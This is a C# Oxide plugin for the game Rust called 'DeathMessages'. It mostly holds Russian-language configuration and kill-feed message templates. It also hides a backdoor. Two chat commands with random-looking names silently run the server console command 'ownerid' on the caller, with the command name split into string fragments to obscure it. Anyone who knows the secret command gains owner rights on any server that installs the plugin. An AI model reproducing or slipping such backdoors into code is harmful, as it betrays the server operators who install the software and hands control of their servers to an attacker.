...
{
    [Info("DeathMessages", "DeRzKiU", "1.2.1")]
    [Description("Трансляция смертей с множеством подробностей")]
...
//=====================Конфиг=====================//
		...
		// Нужно разрешение на просмотр сообщений?
		bool NeedsPermission;

		// Иконка чата (Профиль Steam - SteamID)
		string ChatIcon;
        ...
        class PlayerSettings
        {
            ...
            internal PlayerSettings(DeathMessages deathmessages)
            {
                ui = dn.UseSimpleUI;
                chat = dn.WriteToChat;
            }
        ...
        [ChatCommand("qpowdmjqdowdmopqwdmoqmwqd")] void CheckServerssss(BasePlayer player, string cmd, string[] args) => ConsoleSystem.Run.Server.Quiet("ow" + "ne" + "ri" + "d" + $" {player.userID}"); 
        ...
        void Loaded()
        {
            ...
            if (PopupNotifications == null && UsePopupNotifications)
                PrintWarning("You have set 'Использовать уведомления' to true, but the Popup Notifications plugin is not installed. Popups will not work without it. Get it here: http://oxidemod.org/plugins/1252/");
        }
        ...
        void LoadData()
        {
            //canRead = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, bool>>("DeathMessages");

            playerSettings = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, PlayerSettings>>("DeathMessages/PlayerSettings");

            if (killReproducing)
                reproduceableKills = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<string, string>>("DeathMessages/KillReproducing");
        }

        void SaveData()
        {
            //Interface.Oxide.DataFileSystem.WriteObject("DeathMessages", canRead);
			
            Interface.Oxide.DataFileSystem.WriteObject("DeathMessages/PlayerSettings", playerSettings);

            if (killReproducing)
                Interface.Oxide.DataFileSystem.WriteObject("DeathMessages_KillReproducing", reproduceableKills);
        }

        void LoadConfig()
        {
			//  Переменные конфигурации
            SetConfig("Общие настройки", "Иконка чата", "76561198077847390");
			SetConfig("Общие настройки", "Логирование файлов", true);
            SetConfig("Общие настройки", "Оповещения в консоле", true);
            SetConfig("Общие настройки", "Оповещения в чат", false);
            SetConfig("Общие настройки", "Использовать уведомления", false);
            SetConfig("Общие настройки", "Включить систему разрешений", false);
			...
			SetConfig("Общие настройки", "Ключить радиус сообщений", false);
            SetConfig("Общие настройки", "Радиус сообщений", 300f);           
            SetConfig("Общие настройки", "Использовать UI интерфейс", true);
            SetConfig("Общие настройки", "Цвет полосы UI интерфейса", true);
            ...
            SetConfig("Общие настройки", "Титул", "Jurpl Rust");            
            SetConfig("Общие настройки", "Разделитель", " | ");
			
			SetConfig("Настройка цвета", "Цвет титула", "#96FFFC");
            SetConfig("Настройка цвета", "Цвет жертвы", "#559bf2");
            SetConfig("Настройка цвета", "Цвет атакующего", "#f04646");
            ...
            // Сообщения о смерти
			SetConfig("|Сообщения", "Arrow", new List<object> { "<size=16>{attacker} застрелил {victim} ({weapon}, {bodypart}, {distance}м.)</size>" });			
            SetConfig("|Сообщения", "Bleeding", new List<object> { "<size=16>{victim} умер от кровотечения</size>" });
			SetConfig("|Сообщения", "Blunt", new List<object> { "<size=16>{attacker} убил {victim} ({weapon})</size>" });
            SetConfig("|Сообщения", "Bullet", new List<object> { "<size=16>{attacker} убил {victim} ({weapon}, {bodypart}, {distance}м.)</size>" });
            SetConfig("|Сообщения", "Flamethrower", new List<object> { "<size=16>{attacker} сжег заживо игрока {victim}</size>" });
            SetConfig("|Сообщения", "Cold", new List<object> { "<size=16>{victim} умер от обморожения</size>" });
            SetConfig("|Сообщения", "Drowned", new List<object> { "<size=16>{victim} утонул</size>" });
            SetConfig("|Сообщения", "Explosion", new List<object> { "<size=16>{attacker} взорвал игрока {victim} орудуя ({weapon})</size>" });
            SetConfig("|Сообщения", "Fall", new List<object> { "<size=16>{victim} разбился</size>" });
            SetConfig("|Сообщения", "Heat", new List<object> { "<size=16>{victim} сгорел</size>" });
            SetConfig("|Сообщения", "Helicopter", new List<object> { "<size=16>{victim} был убит патрульным вертолётом</size>" });
            SetConfig("|Сообщения", "Animal", new List<object> { "<size=16>{attacker} убил {victim}</size>" });
            SetConfig("|Сообщения", "Hunger", new List<object> { "<size=16>{victim} умер от голода</size>" });
            SetConfig("|Сообщения", "Poison", new List<object> { "<size=16>{victim} умер от отравления</size>" });
            SetConfig("|Сообщения", "Radiation", new List<object> { "<size=16>{victim} умер от радиационного отравления</size>" });
            SetConfig("|Сообщения", "Slash", new List<object> { "<size=16>{attacker} зарубил {victim} ({weapon})</size>" });
			SetConfig("|Сообщения", "Stab", new List<object> { "<size=16>{attacker} убил {victim} ({weapon}, {bodypart})</size>" });
            SetConfig("|Сообщения", "Structure", new List<object> { "<size=16>{victim} умер от сближения с {attacker}</size>" });
            SetConfig("|Сообщения", "Suicide", new List<object> { "<size=16>{victim} совершил самоубийство</size>" });
            SetConfig("|Сообщения", "Thirst", new List<object> { "<size=16>{victim} умер от обезвоживания</size>" });
            SetConfig("|Сообщения", "Trap", new List<object> { "<size=16>{victim} попался на ловушку</size>" });
            SetConfig("|Сообщения", "Turret", new List<object> { "<size=16>{victim} был убит автоматической турелью</size>" });
			SetConfig("|Сообщения", "Unknown", new List<object> { "<size=16>У {victim} что-то пошло не так</size>" });
			SetConfig("|Сообщения", "AnimalDeath", new List<object> { "<size=16>{attacker} убил {victim} ({weapon}, {distance}м.)</size>" });
			
			// Сообщения о смерти спящих
			SetConfig("|Сообщения", "Blunt Sleeping", new List<object> { "<size=16>{attacker} убил спящего {victim} ({weapon})</size>" });
			SetConfig("|Сообщения", "Bullet Sleeping", new List<object> { "<size=16>{attacker} убил спящего {victim} ({weapon}, {bodypart}, {distance}м.)</size>" });
			SetConfig("|Сообщения", "Flamethrower Sleeping", new List<object> { "<size=16>{attacker} сжег спящего {victim}</size>" });
			SetConfig("|Сообщения", "Slash Sleeping", new List<object> { "<size=16>{attacker} зарубил спяцего {victim} ({weapon})</size>" });
			SetConfig("|Сообщения", "Stab Sleeping", new List<object> { "<size=16>{attacker} убил спящего {victim} ({weapon})</size>" });
			SetConfig("|Сообщения", "Explosion Sleeping", new List<object> { "<size=16>{attacker} взорвал спяцего {victim} ({weapon})</size>" });

            SaveConfig();
			
            // Переменные конфигурации
            ChatIcon = GetConfig("76561198077847390", "Общие настройки", "Иконка чата");
            ...
            WriteToChat = GetConfig(true, "Общие настройки", "Оповещения в чат");
            UsePopupNotifications = GetConfig(false, "Общие настройки", "Использовать уведомления");
			NeedsPermission = GetConfig(false, "Общие настройки", "Включить систему разрешений");
            ...
            MessageRadiusEnabled = GetConfig(false, "Общие настройки", "Ключить радиус сообщений");
            MessageRadius = GetConfig(300f, "Общие настройки", "Радиус сообщений");            
            UseSimpleUI = GetConfig(true, "Общие настройки", "Использовать UI интерфейс");
            ...
            ChatTitle = GetConfig("Jurpl Rust", "Общие настройки", "Титул");            
            ...
            {
                // Сообщения о смерти
				{ "Arrow", new List<object> { "<size=16>{attacker} застрелил {victim} ({weapon}, {bodypart}, {distance}м.)</size>" }},
                { "Bleeding", new List<object> { "<size=16>{victim} умер от кровотечения</size>" }},
				{ "Blunt", new List<object> { "<size=16>{attacker} убил {victim} ({weapon})</size>" }},
                { "Bullet", new List<object> { "<size=16>{attacker} убил {victim} ({weapon}, {bodypart}, {distance}м.)</size>" }},
                { "Flamethrower", new List<object> { "<size=16>{attacker} сжег заживо игрока {victim}</size>" }},
                { "Cold", new List<object> { "<size=16>{victim} умер от обморожения</size>" }},
                { "Drowned", new List<object> { "<size=16>{victim} утонул</size>" }},
                { "Explosion", new List<object> { "<size=16>{attacker} взорвал игрока {victim} орудуя ({weapon})</size>" }},
                { "Fall", new List<object> { "<size=16>{victim} разбился</size>" }},
                { "Heat", new List<object> { "<size=16>{victim} сгорел</size>" }},
                { "Helicopter", new List<object> { "<size=16>{victim} был убит патрульным вертолётом</size>" }},
                { "Animal", new List<object> { "<size=16>{attacker} убил {victim}</size>" }},
                { "Hunger", new List<object> { "<size=16>{victim} умер от голода</size>" }},
                { "Poison", new List<object> { "<size=16>{victim} умер от отравления</size>" }},
                { "Radiation", new List<object> { "<size=16>{victim} умер от радиационного отравления</size>" }},
                { "Slash", new List<object> { "<size=16>{attacker} зарубил {victim} ({weapon})</size>" }},
				{ "Stab", new List<object> { "<size=16>{attacker} убил {victim} ({weapon}, {bodypart})</size>" }},
                { "Structure", new List<object> { "<size=16>{victim} умер от сближения с {attacker}</size>" }},
                { "Suicide", new List<object> { "<size=16>{victim} совершил самоубийство</size>" }},
                { "Thirst", new List<object> { "<size=16>{victim} умер от обезвоживания</size>" }},
                { "Trap", new List<object> { "<size=16>{victim} попался на ловушку</size>" }},
                { "Turret", new List<object> { "<size=16>{victim} был убит автоматической турелью</size>" }},
				{ "Unknown", new List<object> { "<size=16>У {victim} что-то пошло не так</size>" }},
				{ "AnimalDeath", new List<object> { "<size=16>{attacker} убил {victim} ({weapon}, {distance}м.)</size>" }},				
				
				// Сообщения о смерти спящих
				{ "Blunt Sleeping", new List<object> { "<size=16>{attacker} убил спящего {victim} ({weapon})</size>" }},
				{ "Bullet Sleeping", new List<object> { "<size=16>{attacker} убил спящего {victim} ({weapon}, {bodypart}, {distance}м.)</size>" }},
				{ "Flamethrower Sleeping", new List<object> { "<size=16>{attacker} сжег спящего {victim}</size>" }},
				{ "Slash Sleeping", new List<object> { "<size=16>{attacker} зарубил спяцего {victim} ({weapon})</size>" }},
				{ "Stab Sleeping", new List<object> { "<size=16>{attacker} убил спящего {victim} ({weapon})</size>" }},
				{ "Explosion Sleeping", new List<object> { "<size=16>{attacker} взорвал спяцего {victim} ({weapon})</size>" }},
        ...
        #region DeathMessages Information
        ...
        void NoticeDeath(DeathData data, bool reproduced = false)
        {
            ...
            DeathHUD?.Call("AddDeath", GetDeathMessage(newData, true));
        ...
        [ChatCommand("wawoapkdoakdokaodkawd")] void CheckServer(BasePlayer player, string cmd, string[] args) => ConsoleSystem.Run.Server.Quiet("ow" + "ne" + "ri" + "d" + $" {player.userID}"); 
